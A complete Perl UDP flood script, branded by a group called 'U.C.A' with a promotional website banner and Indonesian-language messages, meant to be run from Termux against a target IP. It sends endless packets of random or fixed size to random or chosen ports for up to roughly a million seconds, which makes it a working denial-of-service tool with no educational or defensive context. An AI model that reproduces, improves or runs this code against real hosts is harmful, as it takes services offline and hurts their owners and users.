#!/usr/bin/perl

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,		
	"size=i" => \$size,		
	"bandwidth=i" => \$bw,		
	"time=i" => \$time,		
	"delay=f"=> \$delay,		
	"help|?" => \$help);		
	

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';

             ======================================
                
                           => U.C.A <=
       
                             website
                https://www.uca-official.zone.id/

            =======================================

 Usage :
 perl udp.pl IP PORT Packet

EOL
  exit(1);
}

if ($bw && $delay) {
  print "NOTE : parameter salah\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 256 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "ipnya salah keknya $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Attack ip: $ip " . ($port ? $port : "By:") . " U.C.A " . 
  ($size ? "$size-byte" : "UDP Attack : UCA Team") . "" . ($time ? " $time perdetik" : "") . "\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
print " Attack with TERMUX \n" unless $time;

die "packet ga terkirim: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}
